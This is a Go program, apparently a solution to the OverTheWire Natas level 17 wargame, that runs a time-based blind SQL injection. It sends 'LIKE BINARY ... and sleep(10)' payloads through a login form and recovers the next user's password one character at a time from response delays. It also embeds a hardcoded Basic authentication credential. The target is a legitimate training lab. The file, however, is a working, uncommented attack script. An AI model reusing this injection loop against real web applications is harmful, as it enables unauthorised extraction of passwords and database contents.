package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func main() {
	fmt.Println("Start")
	client := &http.Client{}

	formdata := url.Values{}
	formdata.Set("submit", "Check existence")

	formurl := "http://natas17.natas.labs.overthewire.org/"
	check := "bBCdDgGjJKlLOpPRVxyZ146"
	password := "6OG1P"

	for len(password) < 32 {
	for _,ch := range check {
		payload := `natas18" and password LIKE BINARY '` + password + string(ch) + `%' and sleep(10) -- `
		formdata.Set("username", payload)
		req,_ := http.NewRequest("POST", formurl, strings.NewReader(formdata.Encode()))

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Authorization", "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==")

		start := time.Now()

		resp,err := client.Do(req)
		if err!= nil {
			fmt.Println(err)
		}
		defer resp.Body.Close() 
		elapsed := time.Since(start).Seconds()

		if elapsed > 5 {
			password += string(ch)
			fmt.Println(password)
			break
		}
	}
}
}
